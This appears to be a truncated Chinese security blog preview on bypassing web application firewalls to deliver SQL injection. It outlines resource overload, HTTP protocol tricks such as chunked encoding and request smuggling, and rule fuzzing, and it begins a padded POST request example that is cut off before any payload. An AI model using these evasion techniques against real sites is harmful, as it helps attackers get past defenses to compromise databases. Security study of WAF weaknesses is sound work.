应用防火墙（WAF）的绕过本质是利用 WAF 与后端服务器在协议解析、资源处理、特性实现上的差异，构造 WAF 无法识别但后端可正常解析的恶意载荷。核心绕过思路可归纳为三个维度：  肝资源：通过超大数据包、垃圾数据填充等方式过载 WAF 检测引擎 肝协议：利用 HTTP 协议特性（分块传输、请求走私等）绕过检测 肝特性：针对 WAF 规则盲点进行 Fuzz，寻找未覆盖的攻击向量   SQL 注入 WAF 绕过方法一：资源过载绕过原理分析WAF 通常对请求包大小和检测时间有限制，通过构造超大数据包（如 10MB+）并在其中嵌入恶意载荷，可以：  触发 WAF 的性能保护机制，导致部分内容不被检测 利用 WAF 的采样检测策略（只检测前 N 字节） 通过大量垃圾数据淹没特征匹配引擎  实战技巧1. 伪造大量无效参数 在正常参数前添加大量垃圾参数，将恶意载荷隐藏在数据包末尾： 123456POST /api/user/query HTTP/1.1Host: target.comContent-Type: application/x-www-form-urle...</div></div></div></a></nav></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Kenny</span></div><div class="footer_custom_text"><div class="footer-links"><a class="footer-link" href="https://yyyxxx.cc" target="_blank" rel="noopener noreferrer">友情链接：映雪安全</a><a class="footer-link" href="https://qm.qq.com/q/QNgesnj1aU" target="_blank" rel="noopener noreferrer">QQ群：点击加群</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div></div></body></html>
